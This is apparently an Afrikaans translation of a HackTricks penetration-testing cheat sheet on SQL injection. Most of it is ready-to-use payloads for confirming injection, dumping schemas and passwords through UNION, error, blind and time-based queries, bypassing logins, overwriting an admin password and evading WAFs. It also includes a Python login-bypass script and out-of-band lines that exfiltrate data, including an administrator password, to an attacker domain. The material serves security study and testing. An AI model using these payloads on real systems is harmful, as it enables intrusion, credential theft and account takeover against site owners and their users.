# SQL Injection

{{#include ../../banners/hacktricks-training.md}}


## Wat is SQL-inspuiting?

'n **SQL-inspuiting** is 'n sekuriteitsfout wat aanvallers toelaat om **in te gryp in databasisnavrae** van 'n toepassing. Hierdie kwesbaarheid kan aanvallers in staat stel om **te sien**, **te wysig**, of **te verwyder** data waartoe hulle nie toegang behoort te hê nie, insluitend inligting van ander gebruikers of enige data waartoe die toepassing toegang kan hê. Sulke aksies kan lei tot permanente veranderinge aan die toepassing se funksionaliteit of inhoud of selfs kompromittering van die bediener of ontkenning van diens.

## Toegangspuntdeteksie

Wanneer 'n webwerf blyk te wees **kwesbaar vir SQL-inspuiting (SQLi)** weens ongewone bedienerreaksies op SQLi-verwante insette, is die **eerste stap** om te verstaan hoe om **data in die navraag in te spuit sonder om dit te ontwrig**. Dit vereis om die metode te identifiseer om **doeltreffend uit die huidige konteks te ontsnap**. Dit is 'n paar nuttige voorbeelde:
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
Dan, jy moet weet hoe om die **navraag reg te stel sodat daar nie foute is nie**. Om die navraag reg te stel, kan jy **data invoer** sodat die **vorige navraag die nuwe data aanvaar**, of jy kan net jou data **invoer** en **'n kommentaar simbool aan die einde voeg**.

_Let daarop dat as jy foutboodskappe kan sien of jy kan verskille opmerk wanneer 'n navraag werk en wanneer dit nie werk nie, sal hierdie fase makliker wees._

### **Kommentaar**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### Bevestiging met logiese operasies

'n Betroubare metode om 'n SQL-inspuitingskwesbaarheid te bevestig, behels die uitvoering van 'n **logiese operasie** en die waarneming van die verwagte uitkomste. Byvoorbeeld, 'n GET-parameter soos `?username=Peter` wat identiese inhoud lewer wanneer dit verander word na `?username=Peter' or '1'='1`, dui op 'n SQL-inspuitingskwesbaarheid.

Op soortgelyke wyse dien die toepassing van **wiskundige operasies** as 'n effektiewe bevestigingstegniek. Byvoorbeeld, as toegang tot `?id=1` en `?id=2-1` dieselfde resultaat lewer, is dit 'n aanduiding van SQL-inspuiting.

Voorbeelde wat logiese operasiebevestiging demonstreer:
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
Hierdie woordlys is geskep om te probeer om **SQL-inspuitings** op die voorgestelde manier te **bevestig**:

{% file src="../../images/sqli-logic.txt" %}

### Bevestiging met Tyd

In sommige gevalle **sal jy geen verandering** op die bladsy wat jy toets, opgemerk nie. Daarom is 'n goeie manier om **blinde SQL-inspuitings** te **ontdek** om die DB aksies te laat uitvoer wat 'n **invloed op die tyd** sal hê wat die bladsy benodig om te laai.\
Daarom gaan ons 'n operasie wat baie tyd sal neem om te voltooi, in die SQL-navraag concat.
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
In sommige gevalle sal die **slaap funksies nie toegelaat word** nie. Dan, in plaas daarvan om daardie funksies te gebruik, kan jy die navraag **kompleks operasies laat uitvoer** wat verskeie sekondes sal neem. _Voorbeelde van hierdie tegnieke gaan apart op elke tegnologie kommentaar lewer (indien enige)_.

### Identifisering van die Agterkant

Die beste manier om die agterkant te identifiseer, is om te probeer om funksies van die verskillende agterkante uit te voer. Jy kan die _**slaap**_ **funksies** van die vorige afdeling of hierdie gebruik (tabel van [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification):
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
Ook, as jy toegang het tot die uitvoer van die navraag, kan jy dit **druk die weergawe van die databasis**.

> [!NOTE]
> 'n Voortsetting waar ons verskillende metodes gaan bespreek om verskillende soorte SQL-inspuitings te ontgin. Ons sal MySQL as voorbeeld gebruik.

### Identifisering met PortSwigger

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## Ontginning van Union-gebaseerde

### Opspoor van die aantal kolomme

As jy die uitvoer van die navraag kan sien, is dit die beste manier om dit te ontgin.\
Eerstens moet ons uitvind wat die **aantal** **kolomme** is wat die **aanvanklike versoek** teruggee. Dit is omdat **albei navrae dieselfde aantal kolomme moet teruggee**.\
Twee metodes word tipies vir hierdie doel gebruik:

#### Order/Groep volgens

Om die aantal kolomme in 'n navraag te bepaal, pas die getal wat in **ORDER BY** of **GROUP BY** klousules gebruik word, geleidelik aan totdat 'n vals antwoord ontvang word. Ten spyte van die verskillende funksies van **GROUP BY** en **ORDER BY** binne SQL, kan albei identies gebruik word om die kolomtelling van die navraag te bepaal.
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

Kies meer en meer null waardes totdat die navraag korrek is:
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_Jy moet `null` waardes gebruik soos in sommige gevalle die tipe van die kolomme aan beide kante van die navraag dieselfde moet wees en null is geldig in elke geval._

### Trek databasisname, tabelname en kolomname uit

In die volgende voorbeelde gaan ons die naam van al die databasisse, die tabelnaam van 'n databasis, die kolomnamen van die tabel onttrek:
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_Daar is 'n ander manier om hierdie data op elke verskillende databasis te ontdek, maar dit is altyd dieselfde metodologie._

## Exploiting Hidden Union Based

Wanneer die uitvoer van 'n navraag sigbaar is, maar 'n union-gebaseerde inspuiting onbereikbaar blyk te wees, dui dit op die teenwoordigheid van 'n **verborgene union-gebaseerde inspuiting**. Hierdie scenario lei dikwels tot 'n blinde inspuitingsituasie. Om 'n blinde inspuiting in 'n union-gebaseerde een te transformeer, moet die uitvoeringsnavraag op die agterkant verstaan word.

Dit kan bereik word deur die gebruik van blinde inspuitingstegnieke saam met die standaard tabelle wat spesifiek is vir jou teiken Databasisbestuurstelsel (DBMS). Om hierdie standaard tabelle te verstaan, word dit aanbeveel om die dokumentasie van die teiken DBMS te raadpleeg.

Sodra die navraag onttrek is, is dit nodig om jou payload aan te pas om die oorspronklike navraag veilig te sluit. Vervolgens word 'n union-navraag by jou payload gevoeg, wat die benutting van die nuut toeganklike union-gebaseerde inspuiting fasiliteer.

Vir meer omvattende insigte, verwys na die volledige artikel beskikbaar by [Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f).

## Exploiting Error based

As jy om een of ander rede **nie** die **uitvoer** van die **navraag** kan sien nie, maar jy kan **die foutboodskappe** sien, kan jy hierdie foutboodskappe gebruik om **data uit die databasis te ex-filtreer**.\
Volg 'n soortgelyke vloei soos in die Union Based benutting, kan jy daarin slaag om die DB te dump.
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## Exploiting Blind SQLi

In hierdie geval kan jy nie die resultate van die navraag of die foute sien nie, maar jy kan **onderskei** wanneer die navraag **terugkeer** 'n **ware** of 'n **valse** antwoord omdat daar verskillende inhoud op die bladsy is.\
In hierdie geval kan jy daardie gedrag misbruik om die databasis karakter vir karakter te dump:
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## Exploiting Error Blind SQLi

Dit is die **dieselfde geval as voorheen** maar in plaas daarvan om tussen 'n waar/onwaar antwoord van die navraag te onderskei, kan jy **onderskei tussen** 'n **fout** in die SQL-navraag of nie (miskien omdat die HTTP-bediener ineenstort). Daarom kan jy in hierdie geval 'n SQL-fout afdwing elke keer wanneer jy die karakter korrek raai:
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## Exploiting Time Based SQLi

In hierdie geval **is daar nie** enige manier om die **reaksie** van die navraag te **onderskei** op grond van die konteks van die bladsy nie. Maar, jy kan die bladsy **langer neem om te laai** as die geraamde karakter korrek is. Ons het hierdie tegniek al voorheen gesien in gebruik om [‘n SQLi kwesbaarheid te bevestig](./#confirming-with-timing).
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## Gestapelde Vrae

Jy kan gestapelde vrae gebruik om **meerdere vrae agtereenvolgens uit te voer**. Let daarop dat terwyl die daaropvolgende vrae uitgevoer word, die **resultate** **nie aan die toepassing teruggestuur** word nie. Daarom is hierdie tegniek hoofsaaklik nuttig in verband met **blinde kwesbaarhede** waar jy 'n tweede vraag kan gebruik om 'n DNS-opsoek, voorwaardelike fout of tydsvertraging te aktiveer.

**Oracle** ondersteun **gestapelde vrae.** **MySQL, Microsoft** en **PostgreSQL** ondersteun dit: `QUERY-1-HERE; QUERY-2-HERE`

## Uit-band Exploitatie

As **geen ander** eksploitasiemetode **gewerk het nie**, kan jy probeer om die **databasis** die inligting na 'n **eksterne gasheer** wat deur jou beheer word, te laat uitvloei. Byvoorbeeld, via DNS-vrae:
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### Uit-baan data uitvloeiing via XXE
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## Geoutomatiseerde Exploitatie

Kyk na die [SQLMap Cheatsheet](sqlmap/) om 'n SQLi kwesbaarheid met [**sqlmap**](https://github.com/sqlmapproject/sqlmap) te exploiteer.

## Tegnologie spesifieke inligting

Ons het reeds al die maniere bespreek om 'n SQL Injection kwesbaarheid te exploiteer. Vind nog 'n paar truuks wat afhanklik is van databasis tegnologie in hierdie boek:

- [MS Access](ms-access-sql-injection.md)
- [MSSQL](mssql-injection.md)
- [MySQL](mysql-injection/)
- [Oracle](oracle-injection.md)
- [PostgreSQL](postgresql-injection/)

Of jy sal **'n baie truuks vind rakende: MySQL, PostgreSQL, Oracle, MSSQL, SQLite en HQL in** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Verifikasie omseiling

Lys om te probeer om die aanmeld funksionaliteit te omseil:

{{#ref}}
../login-bypass/sql-login-bypass.md
{{#endref}}

### Rau hash verifikasie omseiling
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
Hierdie navraag toon 'n kwesbaarheid wanneer MD5 met waar vir rou uitvoer in outentikasie kontroles gebruik word, wat die stelsel vatbaar maak vir SQL-inspuiting. Aanvallers kan dit benut deur insette te skep wat, wanneer gehasht, onverwagte SQL-opdragdele produseer, wat lei tot ongemagtigde toegang.
```sql
md5("ffifdyop", true) = 'or'6�]��!r,��b�
sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!
```
### Geïnkorporeerde hash outentekening omseiling
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**Aanbevole lys**:

Jy moet elke lyn van die lys as gebruikersnaam gebruik en as wagwoord altyd: _**Pass1234.**_\
&#xNAN;_(Hierdie payloads is ook ingesluit in die groot lys wat aan die begin van hierdie afdeling genoem word)_

{% file src="../../images/sqli-hashbypass.txt" %}

### GBK Verifikasie Omseiling

IF ' word geskaap kan jy %A8%27 gebruik, en wanneer ' geskaap word sal dit geskep word: 0xA80x5c0x27 (_╘'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
Python-skrip:
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### Polyglot-inspuiting (multikontext)
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## Invoegingsverklaring

### Wysig wagwoord van bestaande objek/gebruiker

Om dit te doen, moet jy probeer om **'n nuwe objek te skep met die naam "master object"** (waarskynlik **admin** in die geval van gebruikers) deur iets te wysig:

- Skep gebruiker met naam: **AdMIn** (hoofdletters & kleinletters)
- Skep 'n gebruiker met naam: **admin=**
- **SQL Truncation Attack** (wanneer daar 'n soort **lengte beperking** in die gebruikersnaam of e-pos is) --> Skep gebruiker met naam: **admin \[baie spasie] a**

#### SQL Truncation Attack

As die databasis kwesbaar is en die maksimum aantal karakters vir gebruikersnaam byvoorbeeld 30 is en jy wil die gebruiker **admin** naboots, probeer om 'n gebruikersnaam te skep genaamd: "_admin \[30 spasies] a_" en enige wagwoord.

Die databasis sal **kontroleer** of die ingevoerde **gebruikersnaam** **bestaande** is in die databasis. As **nie**, sal dit die **gebruikersnaam** **afkap** tot die **maksimum toegelate aantal karakters** (in hierdie geval tot: "_admin \[25 spasies]_") en dan sal dit **automaties al die spasies aan die einde verwyder** terwyl dit die gebruiker "**admin**" met die **nuwe wagwoord** in die databasis opdateer (sommige foute kan verskyn, maar dit beteken nie dat dit nie gewerk het nie).

Meer inligting: [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_Noot: Hierdie aanval sal nie meer werk soos hierbo beskryf in die nuutste MySQL-installasies nie. Terwyl vergelykings steeds agtergrondspasies standaard ignoreer, sal die poging om 'n string in te voeg wat langer is as die lengte van 'n veld 'n fout tot gevolg hê, en die invoeging sal misluk. Vir meer inligting oor hierdie kontrole:_ [_https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation_](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)

### MySQL Invoeg tydgebaseerde kontrole

Voeg soveel `','',''` by as wat jy oorweeg om die VALUES-verklaring te verlaat. As 'n vertraging uitgevoer word, het jy 'n SQLInjection.
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### OP DUPLIKATE SLUITEL UPDATE

Die `ON DUPLICATE KEY UPDATE` klousule in MySQL word gebruik om aksies vir die databasis spesifiek te maak wanneer 'n poging aangewend word om 'n ry in te voeg wat 'n duplikaatwaarde in 'n UNIEKE indeks of PRIMÊRE SLUITEL sou veroorsaak. Die volgende voorbeeld demonstreer hoe hierdie kenmerk uitgebuit kan word om die wagwoord van 'n administrateurrekening te wysig:

Voorbeeld Payload Inspuiting:

'n Inspuitingspayload kan soos volg saamgestel word, waar twee rye probeer word om in die `users` tabel ingevoeg te word. Die eerste ry is 'n lokval, en die tweede ry teiken 'n bestaande administrateur se e-pos met die bedoeling om die wagwoord op te dateer:
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
Hier is hoe dit werk:

- Die navraag probeer om twee rye in te voeg: een vir `generic_user@example.com` en 'n ander vir `admin_generic@example.com`.
- As die ry vir `admin_generic@example.com` reeds bestaan, word die `ON DUPLICATE KEY UPDATE` klousule geaktiveer, wat MySQL instrueer om die `password` veld van die bestaande ry op "bcrypt_hash_of_newpassword" te werk.
- Gevolglik kan verifikasie dan probeer word met `admin_generic@example.com` met die wagwoord wat ooreenstem met die bcrypt-hash ("bcrypt_hash_of_newpassword" verteenwoordig die nuwe wagwoord se bcrypt-hash, wat vervang moet word met die werklike hash van die gewenste wagwoord).

### Trek inligting uit

#### Skep 2 rekeninge terselfdertyd

Wanneer daar probeer word om 'n nuwe gebruiker en gebruikersnaam te skep, is wagwoord en e-pos nodig:
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### Gebruik van desimale of hexadesimale

Met hierdie tegniek kan jy inligting onttrek deur slegs 1 rekening te skep. Dit is belangrik om te noem dat jy nie iets hoef te kommentaar nie.

Gebruik **hex2dec** en **substr**:
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
Om die teks te verkry kan jy gebruik:
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
Gebruik **hex** en **replace** (en **substr**):
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
## Gerouteerde SQL-inspuiting

Gerouteerde SQL-inspuiting is 'n situasie waar die inspuitbare navraag nie die een is wat uitset gee nie, maar die uitset van die inspuitbare navraag gaan na die navraag wat uitset gee. ([From Paper](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

Voorbeeld:
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## WAF Bypass

[Beginner bypasses hier](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### Geen spasie omseiling

Geen Spasie (%20) - omseiling met behulp van witruimte alternatiewe
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
Geen Spasiestreep - omseil met behulp van kommentaar
```sql
?id=1/*comment*/and/**/1=1/**/--
```
Geen Spasiestreep - omseil met behulp van hakies
```sql
?id=(1)and(1)=(1)--
```
### Geen komma omseiling

Geen Komma - omseiling met OFFSET, FROM en JOIN
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### Generiese Bypasses

Swartlys gebruik sleutelwoorde - omseil met hoofletters/kleinletters
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
Swartlys met sleutelwoorde, nie-sensitief vir hoofletters - omseil met 'n ekwivalente operator
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### Wetenskaplike Notasie WAF omseiling

Jy kan 'n meer diepgaande verduideliking van hierdie truuk in [gosecure blog](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/) vind.\
Basies kan jy die wetenskaplike notasie op onverwagte maniere gebruik om die WAF te omseil:
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### Bypass Column Names Restriction

Eerstens, let op dat as die **oorspronklike navraag en die tabel waaruit jy die vlag wil onttrek dieselfde aantal kolomme het**, jy net kan doen: `0 UNION SELECT * FROM flag`

Dit is moontlik om die **derde kolom van 'n tabel te verkry sonder om sy naam te gebruik** met 'n navraag soos die volgende: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, so in 'n sqlinjection sal dit lyk soos:
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
Of deur 'n **comma bypass** te gebruik:
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
Hierdie truuk is geneem van [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)

### WAF omseil voorstelle gereedskap

{% embed url="https://github.com/m4ll0k/Atlas" %}

## Ander Gidse

- [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Brute-Force Opsporing Lys

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}

​
{{#include ../../banners/hacktricks-training.md}}
